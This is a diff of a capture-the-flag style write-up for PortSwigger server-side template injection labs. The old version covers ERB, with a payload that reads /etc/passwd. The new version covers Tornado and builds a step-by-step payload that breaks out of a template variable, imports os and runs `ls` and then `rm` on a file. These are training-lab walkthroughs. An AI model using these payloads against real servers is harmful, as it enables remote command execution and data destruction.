@@ -1,28 +1,40 @@
-# Lab: Basic server-side template injection
+# Lab: Basic server-side template injection (code context)
 
-**Link**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
+**Link**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
 
 **Solution**:
 
-This lab uses ERB templates
+This lab uses Tornodo template which depends on python
 
-https://docs.ruby-lang.org/en/2.3.0/ERB.html
+https://www.tornadoweb.org/en/stable/template.html
 
-according to the payloads for SSTI for ruby
+In account setting, there is preferred name which takes the user.first_name as a variable input like in the docs `like @{var test = 10} in c#`
 
-[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)
-
-So if we tried the first payload `<%= 7 * 7 %>` we will find its already executed
+```bash
+{% for student in [p for p in people if p.student and p.age > 23] %}
+  <li>{{ escape(student.name) }}</li>
+{% end %}
+```
 
 <p align="center" width="100%">
   <img src="image1.png" width="800" hight="500"/>
 </p>
 
-To perform RCE
+<p align="center" width="100%">
+  <img src="image2.png" width="800" hight="500"/>
+</p>
 
-`<%= system('cat /etc/passwd') %>`
+we will craft a payload to inject OS command
 
-and it works
+1- according to the docs
+
+its written in the code as ``{{ user.frist_name }}``
+
+2- So, image to do another python code, we will close the brackets to be `user.first_name}}`
+
+3- start new python code with {% print(’hello world’) %} to be `user.first_name}}{%import+os%}{os.system('ls')}`
+
+4- to remove the file .txt, so the final payload will be `user.first_name}}{%import+os%}{{os.system('rm+/home/carlos/morale.txt')`
 
 <p align="center" width="100%">
   <img src="image2.png" width="800" hight="500"/>
@@ -34,4 +46,8 @@ To Solve the lab, we will change the command to delete file
 
 <p align="center" width="100%">
   <img src="image3.png" width="800" hight="500"/>
+</p>
+
+<p align="center" width="100%">
+  <img src="image4.png" width="800" hight="500"/>
 </p>
